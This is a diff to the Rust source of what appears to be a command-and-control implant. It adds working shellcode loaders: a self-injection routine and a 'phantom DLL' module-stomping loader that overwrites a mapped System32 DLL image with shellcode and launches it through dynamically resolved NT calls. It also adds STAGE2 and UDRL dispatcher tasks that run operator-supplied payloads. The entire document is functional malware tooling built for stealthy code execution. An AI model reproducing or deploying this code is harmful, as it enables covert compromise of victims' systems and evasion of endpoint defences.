@@ -328,6 +328,131 @@ use windows_sys::Win32::System::Threading::{
     CreateEventW, WaitForSingleObject, GetCurrentThreadId,
 };
 
+// ── In-process shellcode execution (STAGE2) ──────────────────────────────────
+
+#[cfg(target_os = "windows")]
+use windows_sys::Win32::System::Memory::VirtualAlloc;
+
+#[cfg(target_os = "windows")]
+unsafe fn inject_self(sc: &[u8]) -> String {
+    use windows_sys::Win32::System::Threading::CreateThread;
+    let mem = VirtualAlloc(std::ptr::null(), sc.len(), MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
+    if mem.is_null() { return format!("[-] VirtualAlloc failed (err {})", GetLastError()); }
+    std::ptr::copy_nonoverlapping(sc.as_ptr(), mem as *mut u8, sc.len());
+    let mut old = 0u32;
+    VirtualProtect(mem, sc.len(), PAGE_EXECUTE_READ, &mut old);
+    let ht = CreateThread(std::ptr::null(), 0,
+        Some(std::mem::transmute::<*mut std::ffi::c_void, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(mem)),
+        std::ptr::null_mut(), 0, std::ptr::null_mut());
+    if ht == 0 { return format!("[-] CreateThread failed (err {})", GetLastError()); }
+    CloseHandle(ht);
+    format!("[+] self-inject: {} bytes → executing", sc.len())
+}
+
+// ── Phantom DLL / module stomping (UDRL) ─────────────────────────────────────
+
+#[cfg(target_os = "windows")]
+unsafe fn phantom_load(sc: &[u8]) -> String {
+    use windows_sys::Win32::System::LibraryLoader::GetProcAddress;
+    use windows_sys::Win32::System::Threading::CreateThread;
+
+    // Find host DLL
+    let sysroot = std::env::var("SystemRoot").unwrap_or_else(|_| "C:\\Windows".into());
+    let candidates = [
+        format!("{}\\System32\\xpsservices.dll", sysroot),
+        format!("{}\\System32\\clbcatq.dll",     sysroot),
+        format!("{}\\System32\\msasn1.dll",       sysroot),
+    ];
+    let host = match candidates.iter().find(|p| std::path::Path::new(p.as_str()).exists()) {
+        Some(p) => p.clone(),
+        None    => return "[-] phantom_load: no host DLL found".into(),
+    };
+
+    // Resolve ntdll NT functions via GetProcAddress
+    let ntdll = windows_sys::Win32::System::LibraryLoader::GetModuleHandleA(b"ntdll.dll\0".as_ptr());
+    if ntdll == 0 { return "[-] phantom_load: ntdll not loaded".into(); }
+
+    macro_rules! resolve {
+        ($name:literal) => {{
+            let p = GetProcAddress(ntdll, concat!($name, "\0").as_ptr());
+            match p { Some(f) => f as *const (), None => return concat!("[-] resolve: ", $name).into() }
+        }};
+    }
+
+    let pfn_open:   *const () = resolve!("NtOpenFile");
+    let pfn_close:  *const () = resolve!("NtClose");
+    let pfn_cs:     *const () = resolve!("NtCreateSection");
+    let pfn_map:    *const () = resolve!("NtMapViewOfSection");
+    let pfn_prot:   *const () = resolve!("NtProtectVirtualMemory");
+    let pfn_thread: *const () = resolve!("NtCreateThreadEx");
+
+    // NT path: \??\<drive>\path
+    let nt_path_s = format!("\\??\\{}", host);
+    let nt_path_w: Vec<u16> = nt_path_s.encode_utf16().collect();
+    let nbytes = (nt_path_w.len() * 2) as u16;
+
+    #[repr(C)] struct UnicodeString { len: u16, max_len: u16, buf: *const u16 }
+    #[repr(C)] struct ObjectAttrs  { length: u32, root: isize, name: *const UnicodeString, attribs: u32, sec_desc: *const (), sec_qos: *const () }
+    #[repr(C)] struct IoStatusBlock{ status: i32, _pad: u32, info: usize }
+
+    let ustr = UnicodeString { len: nbytes, max_len: nbytes + 2, buf: nt_path_w.as_ptr() };
+    let oa   = ObjectAttrs   { length: std::mem::size_of::<ObjectAttrs>() as u32, root: 0, name: &ustr, attribs: 0x40, sec_desc: std::ptr::null(), sec_qos: std::ptr::null() };
+    let mut isb: IoStatusBlock = std::mem::zeroed();
+    let mut file_h: isize = 0;
+
+    // NtOpenFile
+    let nt_open: unsafe extern "system" fn(*mut isize, u32, *const ObjectAttrs, *mut IoStatusBlock, u32, u32) -> i32 = std::mem::transmute(pfn_open);
+    let st = nt_open(&mut file_h, 0x80100080u32, &oa, &mut isb, 0x3, 0x60); // GENERIC_READ|FILE_EXECUTE|SYNC, SHARE_READ|DELETE, SYNC_IO|NON_DIR
+    if st != 0 || file_h == 0 { return format!("[-] NtOpenFile: 0x{:08X}", st as u32); }
+
+    // NtCreateSection SEC_IMAGE
+    let nt_close:  unsafe extern "system" fn(isize) -> i32 = std::mem::transmute(pfn_close);
+    let nt_cs: unsafe extern "system" fn(*mut isize, u32, *const (), *const i64, u32, u32, isize) -> i32 = std::mem::transmute(pfn_cs);
+    let mut sec_h: isize = 0;
+    let st2 = nt_cs(&mut sec_h, 0x000F001F, std::ptr::null(), std::ptr::null(), 0x02, 0x01000000, file_h); // SECTION_ALL_ACCESS, PAGE_READONLY, SEC_IMAGE
+    nt_close(file_h);
+    if st2 != 0 || sec_h == 0 { return format!("[-] NtCreateSection: 0x{:08X}", st2 as u32); }
+
+    // NtMapViewOfSection CoW
+    let nt_map: unsafe extern "system" fn(isize, isize, *mut *mut u8, usize, usize, *const i64, *mut usize, u32, u32, u32) -> i32 = std::mem::transmute(pfn_map);
+    let mut base: *mut u8 = std::ptr::null_mut();
+    let mut view_size: usize = 0;
+    let mut st3 = nt_map(sec_h, -1isize, &mut base, 0, 0, std::ptr::null(), &mut view_size, 1, 0, 0x08000020u32); // PAGE_EXECUTE_WRITECOPY
+    if st3 != 0 {
+        base = std::ptr::null_mut(); view_size = 0;
+        st3 = nt_map(sec_h, -1isize, &mut base, 0, 0, std::ptr::null(), &mut view_size, 1, 0, 0x20u32); // PAGE_EXECUTE_READ
+        if st3 != 0 { nt_close(sec_h); return format!("[-] NtMapViewOfSection: 0x{:08X}", st3 as u32); }
+    }
+    nt_close(sec_h);
+
+    let write_size = sc.len().min(view_size);
+
+    // RW → CoW triggers → private pages
+    let nt_prot: unsafe extern "system" fn(isize, *mut *mut u8, *mut usize, u32, *mut u32) -> i32 = std::mem::transmute(pfn_prot);
+    let mut old_prot = 0u32;
+    let mut b2 = base; let mut ws2 = write_size;
+    nt_prot(-1isize, &mut b2, &mut ws2, PAGE_READWRITE, &mut old_prot);
+    std::ptr::copy_nonoverlapping(sc.as_ptr(), base, write_size);
+
+    // RX — never RWX
+    b2 = base; ws2 = write_size;
+    nt_prot(-1isize, &mut b2, &mut ws2, PAGE_EXECUTE_READ, &mut old_prot);
+
+    // Execute
+    let nt_thread: unsafe extern "system" fn(*mut isize, u32, *const (), isize, *const u8, *const (), u32, usize, usize, usize, *const ()) -> i32 = std::mem::transmute(pfn_thread);
+    let mut thr: isize = 0;
+    if nt_thread(&mut thr, 0x1FFFFF, std::ptr::null(), -1isize, base, std::ptr::null(), 0, 0, 0, 0, std::ptr::null()) != 0 || thr == 0 {
+        let ht = CreateThread(std::ptr::null(), 0,
+            Some(std::mem::transmute::<*mut u8, unsafe extern "system" fn(*mut std::ffi::c_void) -> u32>(base)),
+            std::ptr::null_mut(), 0, std::ptr::null_mut());
+        if ht != 0 { CloseHandle(ht); }
+    } else {
+        CloseHandle(thr);
+    }
+
+    format!("[+] phantomLoad: host={} mapped=0x{:x} sc={} B → executing", host, base as usize, sc.len())
+}
+
 #[cfg(target_os = "windows")]
 unsafe fn enable_priv(htok: HANDLE, priv_name: &str) -> bool {
     let name_w = wide(priv_name);
@@ -946,6 +1071,18 @@ pub fn dispatch(t: &mut AgentTransport, task: &TaskWire) {
                 *dyn_working_hours() = wh.to_string();
             }
             t.send_result(task.id, "[+] config updated", "");
+        }
+        #[cfg(target_os = "windows")]
+        "STAGE2" => {
+            if task.payload.is_empty() { t.send_result(task.id, "", "STAGE2: no shellcode payload"); return; }
+            let r = unsafe { inject_self(&task.payload) };
+            t.send_result(task.id, &r, "");
+        }
+        #[cfg(target_os = "windows")]
+        "UDRL" => {
+            if task.payload.is_empty() { t.send_result(task.id, "", "UDRL: no shellcode payload"); return; }
+            let r = unsafe { phantom_load(&task.payload) };
+            t.send_result(task.id, &r, "");
         }
         #[cfg(target_os = "windows")]
         "INJECT_REMOTE" => {
